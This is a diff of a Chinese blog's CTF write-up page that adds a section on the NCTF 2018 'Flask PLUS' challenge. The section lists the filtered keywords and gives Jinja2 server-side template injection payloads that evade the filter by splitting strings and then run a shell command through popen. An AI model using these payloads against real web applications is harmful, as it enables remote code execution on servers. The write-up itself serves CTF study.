@@ -74,7 +74,7 @@
     <div id="toc" class="toc-article">
     <h3><i class="fa-brands fa-readme"></i>  目录</h3>
       <div class="toc-title"></div>
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-text">[HUBUCTF 2022 新生赛]Calculate</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-Calculate"><span class="toc-text">[HUBUCTF 2022 新生赛]Calculate</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF-2018-Flask-PLUS"><span class="toc-text">[NCTF 2018]Flask PLUS</span></a></li></ol>
     </div>
   
         
@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #ff7d73">刷题</a>
+                <a href="/blog/tags/%E5%88%B7%E9%A2%98/" style="color: #00a596">刷题</a>
             </span>
             
         </span>
@@ -260,7 +260,7 @@
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
         <!-- 安装插件npm install hexo-wordcount --save -->
-        <span class="post-count">436字</span>
+        <span class="post-count">526字</span>
       </span>
     </span>
 
@@ -377,6 +377,16 @@ res1 <span class="token operator">=</span> requests<span class="token punctuatio
     time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <hr>
+<h1 id="NCTF-2018-Flask-PLUS"><a href="#NCTF-2018-Flask-PLUS" class="headerlink" title="[NCTF 2018]Flask PLUS"></a>[NCTF 2018]Flask PLUS</h1><blockquote>
+<p>ssti</p>
+</blockquote>
+<p>注入点还是在路由处，fuzz一下，发现ban了os，request，popen，class，mro，subclasses，<code>__init__</code>，subprocess，join</p>
+<p>关键字用拼接绕过，直接找<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>类</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">""</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subcla'</span><span class="token string">'sses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>__init__</code>没了可以用<code>__enter__</code>或者<code>__exit__</code>代替，命令执行</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token string">''</span><span class="token punctuation">[</span><span class="token string">'__cla'</span><span class="token string">'ss__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__subcla'</span><span class="token string">'sses__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">137</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__enter__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'pop'</span><span class="token string">'en'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 
     </div>
     
